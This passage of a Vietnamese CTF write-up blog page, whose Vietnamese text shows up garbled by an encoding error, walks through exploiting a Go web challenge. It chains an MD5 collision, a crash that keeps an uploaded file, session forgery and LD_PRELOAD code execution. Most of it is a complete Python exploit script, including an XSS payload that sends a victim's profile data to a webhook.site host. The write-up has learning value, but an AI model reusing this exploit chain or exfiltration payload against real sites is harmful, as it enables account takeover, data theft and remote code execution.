<li>V·∫≠y ph·∫£i l√†m sao ƒë·ªÉ ghi file c·ªßa m√¨nh v√†o ? ƒê·ªçc v√†o h√†m CheckGuess ta c√≥ th·ªÉ th·∫•y m·ªôt trigger sau kh√° d·ªã</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-go">func (g *Guess) CheckGuess() (bool, string, string) {
    ...
	if md5Equal != shaEqual {
		g.MarkCheater()
	}
    ...
</code></pre>
<p>N·∫øu nh∆∞ md5 b·∫±ng nh∆∞ng sha kh√¥ng b·∫±ng th√¨ s·∫Ω g·ªçi MarkCheater ?
V√† trolling ·ªü ƒë√¢y l√† h√†m MarkCheater n√†y s·∫Ω g√¢y crash program do thi·∫øu d·∫•u &ldquo;?&rdquo;  holy fack</p>
<pre  class="mc-prism hide language-text" ><code class="language-go">	MARK_CHEATER         = `UPDATE users SET cheater = 1 WHERE user_id = ;`
</code></pre>
<p>M√ånh ƒë√£ kh√¥ng nghƒ© t·ªõi tr∆∞·ªùng h·ª£p n√†y trong l√∫c gi·∫£i v√† c≈©ng ƒë√£ kh√¥ng test th·ª≠ function n√†y ƒë√≥ l√† l√Ω do m√¨nh ko t√¨m ƒë∆∞·ª£c bug . V√¨ serverr h·ªó tr·ª£ autorestart n√™n l√∫c n√†y h√†m crash v√† file c·ªßa m√¨nh s·∫Ω kh√¥ng b·ªã x√≥a .
Nh∆∞ng c√≤n m·ªôt ƒëi·ªÅu n·ªØa l√† m√¨nh c·∫ßn ph·∫£i c√≥ md5 EQUAL th√¨ c√°i n√¨ kh√° ƒë∆°n gi·∫£n v√¨ c√≥ l·ªói md5 collision kh√° n·ªïi ti·∫øng v√† c√≥ tool h·ªó tr·ª£ l√† fastcoll .</p>
<ul>
<li>Khi c√≥ ƒë∆∞·ª£c xss th√¨ ta ch·ªâ c·∫ßn redirect bot t·ªõi :
/api/users/{guesser_id}/guesses/guess_id</li>
<li>Stole ƒë∆∞·ª£c display_name v√† register v·ªõi username admin v√† display_name c√πng v·ªõi session c·∫ßn ƒë∆∞·ª£c signed v√† ph·∫ßn c√≤n l·∫°i nh∆∞ tr√™n</li>
</ul>
<p>Script c·ªßa m√¨nh  :</p>
<pre  class="mc-prism hide language-text" ><code class="language-py">import requests
import threading

import jwt

admin_username = &quot;admin-71aaf14e-55d3-4a88-8c31-e9db2f265c3e&quot;
admin_displayName = &quot;eccdce48-7f26-421b-9d75-65f7002453d5&quot;

JWT_KEY =&quot;FUCK&quot;
FLAG_SO_ID  = &quot;&quot;
MALICOUS_SESSION  =&quot;&quot;

url =  &quot;http://localhost:5555&quot;
url = &quot;http://34.59.119.124:17005&quot;
XSS_PATH = &quot;&quot;


def register(username, password,display_name=&quot;1337&quot;,payload=None):   
    s=  requests.Session()
    data = {
        &quot;username&quot;: username,
        &quot;password&quot;: password,
        &quot;display_name&quot;: display_name,
    }
    

    token = &quot;&quot;
    if payload : 
        token = jwt.encode(payload, JWT_KEY, algorithm=&quot;HS256&quot;)
    with open(&quot;flag.so&quot;, &quot;rb&quot;) as flag_file:
        files = {&quot;flag&quot;: flag_file}
        cookies = {&quot;session&quot;: token}
        response = requests.post(f&quot;{url}/register&quot;,data=data, files=files, cookies=cookies, allow_redirects=False)
        print(response.cookies)
        return response

def login(username, password):
    s = requests.Session()
    data = {
        &quot;username&quot;: username,
        &quot;password&quot;: password,
    }
    response = s.post(f&quot;{url}/login&quot;, data=data,allow_redirects=False)
    print(response.cookies)
    return s



def getProfile(session):
    res = session.get(url+'/api/profile',allow_redirects=False)
    print(res.text)
    return res.json()

def bot(session) :  
    global XSS_PATH
    payload = &quot;fetch('/api/profile').then(res=&gt;res.json()).then(text=&gt;fetch('https://webhook.site/49982724-4ed4-4980-bdbc-f7efed1b6335?q='+text.display_name+'&amp;u='+text.username))&quot;
    data = {
        &quot;url&quot;  : XSS_PATH + &quot;#&quot; +payload
    }
    res = session.post(url+'/api/report',json=data)
    print(res.text)

def createMsg1(username,password):
    s=  requests.Session()
    data = {
        &quot;username&quot;:username,
        &quot;password&quot;: password,
        &quot;display_name&quot;: &quot;1337&quot;,
    }
    with open(&quot;msg1.bin&quot;, &quot;rb&quot;) as flag_file:
        files = {&quot;flag&quot;: flag_file}
        response = requests.post(f&quot;{url}/register&quot;,data=data, files=files, allow_redirects=False)
        print(response.cookies)
        return response

def checkFlag(session,checked_id,checker_id) :  
    global XSS_PATH
    with open(&quot;msg2.bin&quot;, &quot;rb&quot;) as f: 
        data = {
            &quot;flag&quot;: f.read()
        }
        try :
            response = session.post(f&quot;{url}/api/users/{checked_id}/checkflag&quot;,data=data,allow_redirects=False)
            print(&quot;FAIL&quot;)
        except :
            print(&quot;SUCCESSFULLLY&quot;)
            res  = session.get(f&quot;{url}/api/users/{checker_id}/guesses&quot;,allow_redirects=False)
            guess_id = res.json()['guesses'][-1]['guess_id']
            XSS_PATH += f&quot;/api/users/{checker_id}/guesses/{guess_id}&quot;
            print(&quot;XSS_URL: &quot;, XSS_PATH)
##Create HasH

if admin_displayName ==&quot;&quot; : 
    username= &quot;fucaka&quot;
    password=  &quot;fuckaa&quot;
    createMsg1(username,password)
    s = login(username,password)
    msg1Id = getProfile(s)
    print(f&quot;MSG1 ID = {msg1Id}\n&quot;)


    ## Createt guesser
    username = &quot;guessers&quot;
    password = &quot;guessers&quot;
    register(username,password)
    s = login(username,password)
    guesserId = getProfile(s)
    print(f&quot;GUESSER ID  = {guesserId}&quot;)
    checkFlag(s,msg1Id,guesserId)
    bot (s)
    exit(0)

## Now we have the display name ##
## TIME TO EXPLOIT ## 

register(&quot;SOaaa&quot;,&quot;SOaaa&quot;)
s = login(&quot;SOaaa&quot;,&quot;SOaaa&quot;)


FLAG_SO = getProfile(s)
print(f&quot;FLAG_SO_ID: {FLAG_SO['user_id']}&quot;)
props =  {
            &quot;description&quot; : &quot;FUCk&quot; ,
            &quot;LD_PRELOAD&quot; :  f&quot;/app/userdata/{FLAG_SO['user_id']}/flag.txt&quot;,
    }
FLAG_SO[&quot;logged_in&quot;] = True
FLAG_SO['properties'] = props
register (admin_username,&quot;?&quot;,admin_displayName,FLAG_SO) 
</code></pre>

<h2 id="new-knowledge" class="header-anchor-wrapper">New knowledge
  <a href="#new-knowledge" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<ul>
<li>Rce gadget through ENV $LD_PRELOAD (m√¨nh khong bi·∫øt ƒëi·ªÅu n√†y n√™n ƒë√£ kh√° v∆∞·ªõng b·∫≠n khi t√¨m gadget rce)</li>
<li>md5 collision</li>
<li>Forgery session with race condition ( ƒë√¥i khi kh√¥ng c·∫ßn leak jwt key ƒë·ªÉ c√≥ m·ªôt signed session)</li>
</ul>

<h2 id="r√∫t-kinh-nghi·ªám-" class="header-anchor-wrapper">R√∫t kinh nghi·ªám :
  <a href="#r%c3%bat-kinh-nghi%e1%bb%87m-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<ol>
<li>ƒê·ªçc kƒ© h∆°n :)</li>
<li>Test m·ªçi case ƒë·ªÅ ch·∫∑n</li>
<li>Tr√¨nh</li>
</ol>

</article>
</div>
   
      </div>
    </main>
<footer>
    <article>Copyright ¬© 2025 by 3HLD Team | v1.0</article>
</footer>

</body>
</html>
